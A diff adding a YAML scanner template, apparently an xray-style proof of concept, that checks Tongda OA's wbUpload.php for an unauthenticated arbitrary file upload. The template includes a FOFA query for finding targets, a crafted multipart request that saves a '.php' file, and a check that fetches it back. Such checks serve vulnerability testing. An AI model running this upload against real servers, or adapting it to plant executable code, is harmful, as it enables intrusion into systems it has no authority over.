@@ -1,0 +1,31 @@
+id: poc-yaml-tongda-oa-wbupload-php-anyfile-upload
+info:
+  name: 通达OA wbUpload.php 前台任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 通达OA
+  fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /general/vmeet/wbUpload.php?fileName={{.t1}}.php+
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------307456622713326098592248556830
+  data: '-----------------------------307456622713326098592248556830
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.png"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    -----------------------------307456622713326098592248556830--'
+  expression: status_code == 200
+- method: GET
+  path: /general/vmeet/wbUpload/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
